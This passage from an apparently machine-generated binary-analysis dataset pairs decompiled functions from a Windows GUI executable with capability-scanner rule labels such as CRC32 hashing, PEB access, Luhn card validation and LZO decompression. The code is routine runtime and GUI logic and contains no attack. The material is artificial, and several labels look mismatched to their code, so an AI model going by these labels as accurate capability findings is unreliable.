        "decompiled_code": "\nuint32_t __fastcall fcn.00415448(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    \n    if (param_2 < *(in_EAX + 4)) {\n        return -((*(*(in_EAX + 8) + (param_2 >> 3)) >> (param_2 & 7) & 1) != 0) & 1;\n    }\n    fcn.0040c668();\n    uVar1 = fcn.004047cc();\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "0041b764": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0041b764(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.00414fd4();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x41b7bc != (*0x41b7bc & *(in_EAX + 0x1c)))) {\n            fcn.0041b6a0();\n        }\n        else {\n            fcn.0041b72c();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043df2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043df2c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.0043e534(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.00409580();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0044466c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044466c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x444708 == cVar1) || (*0x444708 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.00444a80();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "004449e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004449e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.004472b4();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.00445a00();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.00444a80();\n        fcn.0044829c();\n        (**(*in_EAX + 0x80))();\n        fcn.00446870(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.00404154();\n        }\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "00445394": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00445394(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44542a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.004455ac();\n        fcn.004051b0();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004040e4();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x004453f6;\n            }\n            bVar2 = true;\n            goto code_r0x004453fc;\n        }\n    }\ncode_r0x004453f6:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x004453fc:\n    fcn.0041ba7c();\n    if (bVar2) {\n        fcn.004455dc();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x445431;\n    uStack32 = 0x445429;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 460
    },
    "00445820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445820(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00414f48();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.00414dd8();\n                fcn.00414f68();\n                fcn.00445a00();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.00458434();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.00404154();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0044b5c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b5c4(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x44b614 == (*0x44b610 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.004472b4();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 186
    },
    "0044b618": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044b618(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.0044d574();\n    fcn.0044829c();\n    (**(*in_EAX + -0x10))();\n    fcn.0044909c();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0045828c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0045828c(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x4582e0;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x4582e0 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "0045a7f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a7f4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.0045c040();\n        }\n        fcn.004454cc();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0045f9b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0045f9b0(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x4929b8)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 112
    },
    "0046dc1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046dc1c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(param_2 + 8);\n    uStack28 = *(uVar1 + 0x18);\n    puStack32 = 0x46dc3e;\n    uVar2 = sub.gdi32.dll_SaveDC();\n    puStack32 = 0x46dc4f;\n    fcn.00421928();\n    uStack36 = 0x46dcfa;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00421d14();\n    fcn.00421b80();\n    fcn.00421b9c();\n    uVar3 = uVar1 & 0xffffff00 | (*(uVar1 + 0x10) & 1) != 0;\n    (**(*in_EAX + 0xdc))();\n    *in_FS_OFFSET = uVar3;\n    uStack36 = 0x46dd01;\n    uStack40 = 0x46dcdb;\n    fcn.00421d14();\n    uStack40 = 0x46dce9;\n    fcn.00421b58();\n    uStack40 = uVar2;\n    sub.gdi32.dll_RestoreDC(*(uVar1 + 0x18));\n    return;\n}\n",
        "token_count": 410
    },
    "004718bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004718bc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 1) == 0) && (iVar2 = fcn.00446870(&fcn.004718bc::var_18h),  iVar2 != 0)) {\n        var_4h = var_ch;\n        cVar1 = fcn.004040e4();\n        if ((cVar1 != '\\x01') && (((var_10h & 8) == 0) != *(var_4h + 0x57))) {\n            fcn.0047216c();\n        }\n        puStack68 = 0x471935;\n        iVar2 = fcn.00446870(&fcn.004718bc::var_28h);\n        if (iVar2 != 0) {\n            puStack68 = 0x47194b;\n            fcn.004040e4();\n            if (cVar1 != '\\0') {\n                puStack68 = 0x47195a;\n                (**(*var_4h + 0x94))();\n            }\n            uStack72 = 0x471a10;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            puStack68 = &stack0xfffffffc;\n            cVar1 = fcn.004040e4();\n            if (cVar1 == '\\x01') {\n                fcn.00444edc();\n            }\n            else {\n                cVar1 = fcn.004040e4();\n                if (cVar1 != '\\0') {\n                    fcn.0044d1a4();\n                }\n                fcn.00444edc();\n                if (var_4h[0x13] < var_1ch - var_24h) {\n                    (**(*var_4h + 0x88))(var_4h[0x13], var_20h - var_28h);\n                }\n            }\n            *in_FS_OFFSET = uStack76;\n            puStack68 = 0x471a17;\n            uStack72 = 0x471a00;\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\n                uStack72 = 0x471a0f;\n                (**(*var_4h + 0x98))();\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 653
    },
    "00472518": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00472518(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x288)) {\n        *(in_EAX + 0x288) = param_2;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            fcn.00449ecc();\n        }\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0047e3dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0047e3dc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    \n    iVar1 = *(in_EAX + 0x1cc);\n    iVar2 = (***(in_EAX + 4))();\n    iVar5 = 0;\n    piVar4 = iVar2 + 0x3fc;\n    uVar3 = 0;\n    *(iVar1 + 0x28) = piVar4;\n    piVar6 = piVar4;\n    do {\n        *piVar6 = iVar5;\n        piVar4[-uVar3] = -iVar5;\n        piVar6 = piVar6 + 1;\n        uVar3 = uVar3 + 1;\n        iVar5 = iVar5 + 1;\n    } while (uVar3 < 0x10);\n    piVar6 = piVar4 + uVar3;\n    while (uVar3 < 0x30) {\n        *piVar6 = iVar5;\n        piVar6 = piVar6 + 1;\n        piVar4[-uVar3] = -iVar5;\n        iVar5 = iVar5 + ((uVar3 + 1 & 1) == 0);\n        uVar3 = uVar3 + 1;\n    }\n    piVar6 = piVar4 + uVar3;\n    for (; uVar3 < 0x100; uVar3 = uVar3 + 1) {\n        *piVar6 = iVar5;\n        piVar6 = piVar6 + 1;\n        piVar4[-uVar3] = -iVar5;\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "00404b8c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00404b8c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x490000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x490004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 223
    },
    "00408d52": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d52(uint param_1, uint32_t param_2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    do {\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / 10;\n        puVar6 = puVar6 + -1;\n        cVar4 = uVar1 % 10;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n    } while (in_EAX != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar2 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar2)[iVar5] = 0x30;\n        }\n        puVar6[iVar2] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0040a1d7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a1d7(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40a1c3 + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040a26e;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040a277;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040a27e;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040a2a4:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040a27e:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040a26e:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040a277:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040a2a4;\n}\n",
        "token_count": 1161
    },
    "00460888": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460888(void)\n\n{\n    fcn.0040e118();\n    return;\n}\n",
        "token_count": 24
    },
    "00415460": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00415460(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x4154d4 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x004154cc;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x004154cc:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 432
    },
    "0047d87c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047d87c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX < arg_8h) {\n        do {\n            if (arg_8h < in_ECX * 2) {\n                piVar1 = fcn.0047d484();\n            }\n            else {\n                piVar1 = fcn.0047d458();\n            }\n            if (piVar1 == NULL) {\n                return in_ECX;\n            }\n            piVar5 = in_ECX * 0x20 + in_EDX;\n            piVar5[1] = piVar1[1];\n            piVar5[3] = piVar1[3];\n            piVar5[5] = piVar1[5];\n            *piVar5 = *piVar1;\n            piVar5[2] = piVar1[2];\n            piVar5[4] = piVar1[4];\n            iVar3 = (piVar1[3] - piVar1[2]) * 0xc;\n            iVar4 = (piVar1[5] - piVar1[4]) * 0x10;\n            iVar2 = 1;\n            if (iVar3 < iVar4) {\n                iVar2 = 2;\n                iVar3 = iVar4;\n            }\n            if (iVar3 < (piVar1[1] - *piVar1) * 8) {\n                iVar2 = 0;\n            }\n            if (iVar2 == 0) {\n                iVar4 = piVar1[1] + *piVar1 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[1] + *piVar1 & 1U) != 0);\n                }\n                piVar1[1] = iVar4;\n                *piVar5 = iVar4 + 1;\n            }\n            else if (iVar2 == 1) {\n                iVar4 = piVar1[3] + piVar1[2] >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[3] + piVar1[2] & 1U) != 0);\n                }\n                piVar1[3] = iVar4;\n                piVar5[2] = iVar4 + 1;\n            }\n            else if (iVar2 == 2) {\n                iVar4 = piVar1[5] + piVar1[4] >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((piVar1[5] + piVar1[4] & 1U) != 0);\n                }\n                piVar1[5] = iVar4;\n                piVar5[4] = iVar4 + 1;\n            }\n            fcn.0047d4ac();\n            fcn.0047d4ac();\n            in_ECX = in_ECX + 1;\n        } while (in_ECX < arg_8h);\n    }\n    return in_ECX;\n}\n",
        "token_count": 750
    },
    "0047df2c": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047df2c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_10h;\n    int16_t *piVar1;\n    int32_t in_ECX;\n    uint *puVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_194h;\n    uint var_114h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(*(in_EAX + 0x1cc) + 0x18);\n    var_4h = in_EDX >> 2;\n    var_8h = in_ECX >> 3;\n    var_10h = (arg_8h >> 2) * 0x20 + 4;\n    arg_10h = fcn.0047db74(&var_114h, var_10h);\n    fcn.0047ddb4(&var_194h, &var_114h, arg_10h, var_10h);\n    var_4h = var_4h * 4;\n    var_8h = var_8h * 8;\n    puVar2 = &var_194h;\n    var_14h = 0;\n    do {\n        iVar4 = 0;\n        do {\n            piVar1 = *(var_ch + (var_4h + var_14h) * 4) + (var_8h + iVar4) * 0x40 + (arg_8h >> 2) * 8;\n            iVar3 = 0;\n            do {\n                *piVar1 = *puVar2 + 1;\n                puVar2 = puVar2 + 1;\n                piVar1 = piVar1 + 1;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 4);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 8);\n        var_14h = var_14h + 1;\n    } while (var_14h < 4);\n    return;\n}\n",
        "token_count": 498
    },
    "004035e0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004035e0(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x00403623:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x0040365e:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x0040365e;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x00403623;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x0040365e;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 486
    },
    "00403664": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
